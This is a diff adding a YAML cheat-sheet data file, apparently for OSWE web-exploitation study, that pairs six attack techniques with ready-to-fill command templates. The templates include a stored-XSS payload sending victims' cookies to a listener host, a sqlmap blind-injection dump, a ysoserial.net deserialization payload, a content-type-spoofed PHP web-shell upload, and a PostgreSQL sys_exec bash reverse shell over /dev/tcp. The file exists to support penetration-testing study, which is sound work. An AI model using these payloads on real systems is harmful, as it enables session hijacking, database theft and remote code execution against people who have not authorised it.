@@ -1,0 +1,138 @@
+sections:
+  - id: oswe.web
+    title: 'OSWE — Web exploitation'
+    os: linux
+    order: 301
+    techniques:
+      [
+        oswe.xss.stored,
+        oswe.xss.dom,
+        oswe.sqli.blind,
+        oswe.deser.dotnet,
+        oswe.upload.bypass,
+        oswe.pgsql.udfrevshell,
+      ]
+    packs: [oswe]
+techniques:
+  - id: oswe.xss.stored
+    title: 'Stored XSS → account takeover'
+    os: [linux]
+    phase: web
+    summary: 'Persist a script that exfiltrates the victim session to your listener.'
+    commands: [oswe.xss.stored.cookie]
+    tags: [web, xss, oswe]
+    references: [ref.osce3.joas, ref.oswe.timip]
+    confidence: verified
+    packs: [oswe]
+  - id: oswe.xss.dom
+    title: 'DOM-based XSS (black box)'
+    os: [linux]
+    phase: web
+    summary: 'Source-to-sink probe for a client-side injection point.'
+    commands: [oswe.xss.dom.probe]
+    tags: [web, xss, oswe]
+    references: [ref.osce3.joas, ref.oswe.timip]
+    confidence: verified
+    packs: [oswe]
+  - id: oswe.sqli.blind
+    title: 'Blind SQL injection'
+    os: [linux]
+    phase: web
+    summary: 'Boolean/time-based blind extraction with sqlmap.'
+    commands: [oswe.sqli.blind.sqlmap]
+    tags: [web, sqli, oswe]
+    references: [ref.osce3.joas, ref.oswe.timip]
+    confidence: verified
+    packs: [oswe]
+  - id: oswe.deser.dotnet
+    title: '.NET deserialization'
+    os: [windows]
+    phase: web
+    summary: 'Generate a deserialization payload with ysoserial.net (gadget/format version-specific).'
+    commands: [oswe.deser.dotnet.yso]
+    tags: [web, deserialization, oswe]
+    references: [ref.osce3.joas, ref.ysoserialnet]
+    confidence: unverified
+    packs: [oswe]
+  - id: oswe.upload.bypass
+    title: 'File-upload + extension-filter bypass'
+    os: [linux]
+    phase: web
+    summary: 'Spoof content-type / magic bytes to slip a server-side script past the filter.'
+    commands: [oswe.upload.bypass.curl]
+    tags: [web, upload, oswe]
+    references: [ref.osce3.joas, ref.oswe.timip]
+    confidence: verified
+    packs: [oswe]
+  - id: oswe.pgsql.udfrevshell
+    title: 'PostgreSQL UDF reverse shell'
+    os: [linux]
+    phase: exploitation
+    summary: 'Call a sys_exec UDF to spawn a reverse shell from the database.'
+    commands: [oswe.pgsql.udfrevshell.sysexec]
+    tags: [web, postgres, oswe]
+    references: [ref.osce3.joas, ref.oswe.timip]
+    confidence: verified
+    packs: [oswe]
+commands:
+  - id: oswe.xss.stored.cookie
+    title: 'Cookie-exfil stored XSS payload'
+    template: '<script>fetch("http://{{LHOST}}/c?"+document.cookie)</script>'
+    shell: text
+    os: [linux]
+    tags: [xss]
+    danger: high
+    confidence: verified
+    references: [ref.osce3.joas, ref.oswe.timip]
+    packs: [oswe]
+  - id: oswe.xss.dom.probe
+    title: 'DOM-XSS sink probe'
+    template: '<img src=x onerror=alert(document.domain)>'
+    shell: text
+    os: [linux]
+    tags: [xss]
+    danger: medium
+    confidence: verified
+    references: [ref.osce3.joas, ref.oswe.timip]
+    packs: [oswe]
+  - id: oswe.sqli.blind.sqlmap
+    title: 'sqlmap blind dump'
+    template: 'sqlmap -u "{{URL}}" --data="{{POST_DATA}}" --technique=B --batch --dump'
+    shell: bash
+    os: [linux]
+    tool: sqlmap
+    tags: [sqli]
+    danger: high
+    confidence: verified
+    references: [ref.osce3.joas, ref.oswe.timip, ref.sqlmap]
+    packs: [oswe]
+  - id: oswe.deser.dotnet.yso
+    title: 'ysoserial.net payload'
+    template: 'ysoserial.exe -g TypeConfuseDelegate -f Json.Net -c "{{CMD}}" -o base64'
+    shell: cmd
+    os: [windows]
+    tags: [deserialization]
+    danger: critical
+    confidence: unverified
+    references: [ref.osce3.joas, ref.ysoserialnet]
+    packs: [oswe]
+  - id: oswe.upload.bypass.curl
+    title: 'Content-type spoof upload'
+    template: 'curl -F "file=@shell.php;type=image/png" {{URL}}'
+    shell: bash
+    os: [linux]
+    tags: [upload]
+    danger: high
+    confidence: verified
+    references: [ref.osce3.joas, ref.oswe.timip]
+    packs: [oswe]
+  - id: oswe.pgsql.udfrevshell.sysexec
+    title: 'sys_exec UDF reverse shell'
+    template: 'SELECT sys_exec(''bash -c "bash -i >& /dev/tcp/{{LHOST}}/{{LPORT}} 0>&1"'');'
+    shell: sql
+    os: [linux]
+    tags: [postgres]
+    danger: critical
+    confidence: verified
+    references: [ref.osce3.joas, ref.oswe.timip]
+    packs: [oswe]
